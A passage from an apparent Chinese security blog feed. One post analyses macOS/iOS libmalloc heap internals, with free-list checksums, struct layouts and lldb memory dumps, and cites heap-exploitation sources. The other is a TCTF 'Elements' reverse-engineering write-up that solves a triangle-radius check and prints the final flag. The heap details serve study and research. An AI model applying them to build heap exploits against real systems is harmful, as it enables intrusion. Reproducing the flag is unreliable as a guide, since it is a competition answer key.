succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th 